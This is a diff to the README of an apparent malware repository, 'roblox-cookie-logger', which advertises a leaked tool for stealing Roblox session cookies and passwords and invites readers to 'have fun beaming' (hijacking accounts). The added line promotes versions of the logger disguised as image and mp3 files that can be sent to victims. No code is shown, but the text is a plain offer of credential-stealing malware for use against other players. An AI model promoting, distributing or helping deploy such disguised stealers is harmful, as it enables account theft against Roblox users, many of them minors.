@@ -1,4 +1,4 @@
 # roblox-cookie-logger
 Simply leaked roblox cookie and password logger. 
 Have fun beaming I guess
-IF ONE FILE DOESNT WORK TRY ANOTHER ONE
+roblox cookie logger has image and even mp3 logger (can be sent as an audio)
